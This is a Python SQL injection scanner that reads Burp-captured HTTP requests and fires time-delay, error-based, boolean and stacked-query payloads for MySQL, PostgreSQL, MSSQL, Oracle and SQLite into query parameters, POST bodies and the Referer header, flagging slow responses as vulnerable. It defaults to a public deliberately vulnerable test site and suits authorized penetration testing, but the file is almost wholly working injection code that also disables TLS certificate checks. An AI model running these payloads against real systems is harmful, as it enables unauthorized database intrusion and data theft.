import os
import time
import requests
import urllib.parse
import logging
import urllib3

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
REQUEST_DIR = "burp_requests"  # Directory where your .txt request files are saved
OUTPUT_DIR = "vulnerable_requests"  # Directory to save flagged vulnerable requests
WAIT_TIME = [1, 2, 3]  # Seconds to test for delays

# Delay payloads for various databases (SQL injection techniques)
DELAY_PAYLOADS = {
    "mysql": "' OR SLEEP({time})--",
    "postgresql": "'; SELECT pg_sleep({time});--",
    "mssql": "'; WAITFOR DELAY '0:0:{time}';--",
    "oracle": "'; BEGIN DBMS_LOCK.SLEEP({time}); END;--",
    "sqlite": "' OR 1=1 AND randomblob(1000000000);--"
}

ERROR_BASED_PAYLOADS = {
    "mysql": "' OR (SELECT 1 FROM (SELECT(SLEEP(1)))a)--",
    "postgresql": "'; SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END;--",
    "mssql": "'; IF (1=1) WAITFOR DELAY '0:0:1';--",
    "oracle": "' || (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(1) ELSE NULL END FROM DUAL)--"
}

BOOLEAN_BASED_PAYLOADS = {
    "mysql": "' AND {condition}--",
    "postgresql": "' AND {condition};--",
    "mssql": "' AND {condition}--",
    "oracle": "' AND {condition}--"
}

STACKED_QUERIES_PAYLOADS = {
    "mysql": "'; SELECT SLEEP({time});--",
    "postgresql": "'; SELECT pg_sleep({time});--",
    "mssql": "'; WAITFOR DELAY '0:0:{time}';--",
    "oracle": "'; BEGIN DBMS_LOCK.SLEEP({time}); END;--"
}

# Set up logging
LOG_FILE = "sql_injection_test.log"
logging.basicConfig(level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.FileHandler(LOG_FILE),
                        logging.StreamHandler()  # Also log to the console
                    ])
logger = logging.getLogger()

# Ensure the output directory exists
if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

def extract_target_url(request_raw):
    """
    Extract the full target URL (with schema) from the raw HTTP request.
    """
    lines = request_raw.split("\n")
    try:
        method, url, _ = lines[0].split(" ", 2)  # Split only into method, URL, and HTTP version
    except ValueError as e:
        logger.error("Malformed request line: %s", lines[0])
        return None, None, None

    if not url.startswith(('http://', 'https://')):
        base_url = "http://testasp.vulnweb.com/"  # Update with a valid base URL if needed
        url = base_url + url  # Combine base URL with the relative URL

    return url, method, lines[1:]

def parse_query_parameters(url):
    """
    Extract parameters from the URL query string.
    """
    url_parts = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(url_parts.query)
    return query_params

def parse_post_body(body):
    """
    Parse the body of a POST request for form data.
    """
    body_params = urllib.parse.parse_qs(body)
    return body_params

def test_target_connection(target_url):
    """
    Test connection to the target URL.
    """
    try:
        response = requests.head(target_url, timeout=10, verify=False)
        if response.status_code in [200, 301, 302]:
            logger.info("Connection to %s successful. HTTP Status: %s", target_url, response.status_code)
            if response.is_redirect:
                logger.warning("Redirect detected to %s", response.headers.get('Location'))
            return True
        else:
            logger.warning("Unexpected HTTP status code: %s", response.status_code)
            return False
    except requests.exceptions.RequestException as e:
        logger.error("Connection test failed: %s", e)
        return False

def handle_redirect(response, method, data, headers):
    """
    Handle HTTP redirects.
    """
    if response.is_redirect:
        new_url = response.headers.get('Location')
        logger.warning("Redirect detected to %s", new_url)
        choice = input("Do you want to follow? [Y/n]: ") or "Y"
        if choice.lower() == "y":
            if method == "POST":
                choice_post = input("Redirect is a result of a POST request. Resend data? [Y/n]: ") or "Y"
                if choice_post.lower() == "y":
                    return new_url, data, headers
            return new_url, None, headers
    return None, None, None

def inject_sql_payloads(url, body, method, headers):
    """
    Inject various SQL payloads into detected parameters in the URL and POST body.
    """
    modified_requests = []

    # Parse URL parameters
    query_params = parse_query_parameters(url)

    for payloads in [DELAY_PAYLOADS, ERROR_BASED_PAYLOADS, BOOLEAN_BASED_PAYLOADS, STACKED_QUERIES_PAYLOADS]:
        for db, payload_template in payloads.items():
            for wait in WAIT_TIME:
                payload = payload_template.format(time=wait, condition="1=1")

                # Inject into URL parameters
                for param in query_params:
                    query_params[param] = [payload]

                # Reconstruct the URL with the injected payloads
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                new_url = urllib.parse.urlunparse((urllib.parse.urlparse(url).scheme,
                                                   urllib.parse.urlparse(url).netloc,
                                                   urllib.parse.urlparse(url).path,
                                                   "", new_query, ""))

                # Modify headers if necessary
                headers_with_referer = headers.copy()
                headers_with_referer["Referer"] = f"https://test-referer.com{payload}"

                # Prepare modified GET request
                modified_request = {
                    "method": method,
                    "url": new_url,
                    "headers": headers_with_referer,
                    "data": None
                }

                modified_requests.append(modified_request)

    if method == "POST" and body:
        body_params = parse_post_body(body)
        for payloads in [DELAY_PAYLOADS, ERROR_BASED_PAYLOADS, BOOLEAN_BASED_PAYLOADS, STACKED_QUERIES_PAYLOADS]:
            for db, payload_template in payloads.items():
                for wait in WAIT_TIME:
                    payload = payload_template.format(time=wait, condition="1=1")

                    for param in body_params:
                        body_params[param] = [payload]

                    new_body = urllib.parse.urlencode(body_params, doseq=True)

                    modified_request = {
                        "method": method,
                        "url": url,
                        "headers": headers,
                        "data": new_body
                    }

                    modified_requests.append(modified_request)

    return modified_requests

def send_request(request_info):
    """
    Sends the HTTP request and checks for vulnerabilities.
    """
    method = request_info["method"]
    url = request_info["url"]
    headers = request_info["headers"]
    data = request_info.get("data", None)

    try:
        logger.debug("Sending request to %s with method %s", url, method)
        start_time = time.time()
        response = requests.request(
            method=method,
            url=url,
            headers=headers,
            data=data,
            timeout=30,
            verify=False
        )
        elapsed_time = time.time() - start_time

        if response.is_redirect:
            return handle_redirect(response, method, data, headers)

        return elapsed_time
    except requests.exceptions.RequestException as e:
        logger.error("Error sending request: %s", e)
        return None

def main():
    """
    Main script execution.
    """
    request_files = [os.path.join(REQUEST_DIR, f) for f in os.listdir(REQUEST_DIR) if f.endswith(".txt")]

    if not request_files:
        logger.warning("No .txt request files found in %s. Exiting.", REQUEST_DIR)
        return

    vulnerable_requests = []
    logger.info("Testing for SQL injection vulnerabilities...")

    for request_file in request_files:
        with open(request_file, "r") as f:
            request_raw = f.read()

        target_url, method, request_lines = extract_target_url(request_raw)
        if not target_url:
            logger.error("Could not extract target URL. Skipping request.")
            continue

        if not test_target_connection(target_url):
            logger.warning("Skipping unreachable target: %s", target_url)
            continue

        headers = {}
        body = None

        for line in request_lines:
            if ":" in line:
                key, value = line.split(":", 1)
                headers[key.strip()] = value.strip()
            elif line.strip() == "":
                break

        if "\n\n" in request_raw:
            body = request_raw.split("\n\n", 1)[1]

        modified_requests = inject_sql_payloads(target_url, body, method, headers)

        for modified_request in modified_requests:
            elapsed_time = send_request(modified_request)
            if elapsed_time and elapsed_time >= max(WAIT_TIME):
                logger.info("[Potential Vulnerability] Delay detected for %s", target_url)
                output_file = os.path.join(OUTPUT_DIR, f"vulnerable_request_{os.path.basename(request_file)}.txt")
                with open(output_file, "w") as out_f:
                    out_f.write(f"Original Request File: {request_file}\n\n")
                    out_f.write(str(modified_request))
                vulnerable_requests.append(output_file)

    if vulnerable_requests:
        logger.info("\nVulnerable Requests:")
        for vr in vulnerable_requests:
            logger.info("- %s", vr)
    else:
        logger.info("\nNo vulnerabilities detected.")

if __name__ == "__main__":
    main()
